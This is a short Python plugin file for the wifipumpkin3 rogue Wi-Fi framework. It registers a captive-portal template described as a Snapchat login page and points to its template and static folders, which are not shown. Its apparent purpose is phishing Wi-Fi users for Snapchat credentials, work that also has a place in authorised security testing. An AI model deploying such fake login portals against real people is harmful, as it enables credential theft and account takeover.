# content file: snapchat.py
from wifipumpkin3.plugins.captiveflask.plugin import CaptiveTemplatePlugin
import wifipumpkin3.core.utility.constants as C

class Snapchat(CaptiveTemplatePlugin):
    Name = "snapchat"
    Version = "1.0"
    Description = "Template for snapchat page login"
    Author = "Dr.rootsu"
    TemplatePath = C.TEMPLATES_FLASK + "templates/snapchat"
    StaticPath = C.TEMPLATES_FLASK + "templates/snapchat/static"
    Preview = C.TEMPLATES_FLASK + "templates/snapchat/preview.png"